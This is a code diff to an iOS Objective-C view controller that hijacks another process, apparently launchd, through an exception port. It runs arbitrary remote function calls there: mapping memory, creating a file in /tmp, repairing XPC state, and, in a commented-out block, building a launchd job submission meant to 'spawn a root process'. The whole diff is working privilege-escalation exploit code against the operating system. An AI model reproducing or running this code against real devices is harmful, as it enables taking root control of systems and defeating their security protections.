@@ -6,9 +6,11 @@
 //
 
 @import Darwin;
+@import XPC;
 #import "ViewController.h"
 #include "Header.h"
 #include <sys/wait.h>
+
 
 @interface ViewController ()
 @property(nonatomic) mach_port_t exceptionPort;
@@ -106,15 +108,70 @@
 
 - (void)arbCallButtonTapped {
     dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
-        //RemoteArbCall((void*)sleep, 1, 0);
-        //printf("--- MARK: DONE FUNCTION CALL 1 ---\n");
-//        RemoteArbCall((void*)dlopen, 0x41414141, 0);
-//        printf("--- MARK: DONE FUNCTION CALL ---\n");
+        //RemoteArbCall(atexit, 0x41414100);
         
         vm_address_t map = RemoteArbCall(mmap, 0, 0x4000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
-        printf("Mapped memory at 0x%llx\n", map);
+        printf("Mapped memory at 0x%lx\n", map);
+        
+        // Test mkdir
         RemoteWriteString(map, "/tmp/.it_works");
         RemoteArbCall(mkdir, map, 0700);
+        
+        // We have some unitialized variables in xpc since we crashed here, so we need to fix them up
+        RemoteArbCall(task_get_special_port, 0x203, TASK_BOOTSTRAP_PORT, map);
+        mach_port_t remote_bootstrap_port = RemoteRead32(map);
+        RemoteWriteString(map, "_os_alloc_once_table");
+        struct _os_alloc_once_s *remote_os_alloc_once_table = (struct _os_alloc_once_s *)RemoteArbCall(dlsym, (uint64_t)RTLD_DEFAULT, map);
+        struct xpc_global_data *globalData = (struct xpc_global_data *)RemoteArbCall(_os_alloc_once, (uint64_t)&remote_os_alloc_once_table[1], 472, 0);
+        RemoteWrite64((uint64_t)&remote_os_alloc_once_table[1].once, 0xFFFFFFFFFFFFFFFF);
+        vm_address_t xpc_bootstrap_pipe = RemoteArbCall(xpc_pipe_create_from_port, remote_bootstrap_port, 0);
+        //RemoteRead64((uint64_t)&globalData->xpc_bootstrap_pipe);
+        printf("xpc_bootstrap_pipe: 0x%lx\n", xpc_bootstrap_pipe);
+        RemoteWrite64((uint64_t)&globalData->xpc_bootstrap_pipe, xpc_bootstrap_pipe);
+        
+        printf("Waiting 5 seconds before detach...\n");
+        sleep(5);
+        RemoteDetach();
+        
+        /*
+        // Now we can submit a launch job
+        vm_address_t root = RemoteArbCall(xpc_dictionary_create, 0, 0, 0);
+        vm_address_t submitJob = RemoteArbCall(xpc_dictionary_create, 0, 0, 0);
+        
+        RemoteWriteString(map, "LaunchOnlyOnce");
+        RemoteArbCall(xpc_dictionary_set_bool, submitJob, map, true);
+        RemoteWriteString(map, "ExitTimeOut");
+        RemoteArbCall(xpc_dictionary_set_int64, submitJob, map, 30);
+        RemoteWriteString(map, "POSIXSpawnType");
+        RemoteWriteString(map+0x100, "Interactive");
+        RemoteArbCall(xpc_dictionary_set_string, submitJob, map, map+0x100);
+        RemoteWriteString(map, "Label");
+        RemoteWriteString(map+0x100, "com.apple.dt.instruments.dtsecurity.haxx");
+        RemoteArbCall(xpc_dictionary_set_string, submitJob, map, map+0x100);
+        RemoteWriteString(map, "Program");
+        RemoteWriteString(map+0x100, "/System/Library/PrivateFrameworks/DVTInstrumentsFoundation.framework/XPCServices/com.apple.dt.instruments.dtsecurity.xpc/com.apple.dt.instruments.dtsecurity");
+        RemoteArbCall(xpc_dictionary_set_string, submitJob, map, map+0x100);
+        
+        RemoteWriteString(map, "SubmitJob");
+        
+        printf("Waiting 5 seconds before xpc_dictionary_set_value...\n");
+        sleep(5);
+        RemoteArbCall(xpc_dictionary_set_value, root, map, submitJob);
+        
+        //RemoteArbCall(xpc_release, submitJob);
+        
+        printf("Submitting launch job...\n");
+        RemoteArbCall(_launch_msg2, root, 3, 0);
+        */
+        
+        //RemoteArbCall(munmap, map, 0x4000);
+        
+        
+//        RemoteArbCall((void*)dlopen, 0x41414141, 0);
+//        printf("--- MARK: DONE FUNCTION CALL ---\n");
+//        RemoteWriteString(map, "/tmp/.it_works");
+//        RemoteArbCall(mkdir, map, 0700);
+        
         
         // submit a launch job to launchd to spawn a root process
         
@@ -131,7 +188,6 @@
 //        RemoteArbCall(mprotect, map, 0x4000, PROT_READ | PROT_EXEC);
 //        _tmp_ptr = (uint64_t)map;
 //        RemoteArbCall(((uint64_t (*)(void))map));
-        RemoteArbCall(munmap, map, 0x4000);
     });
 }
 
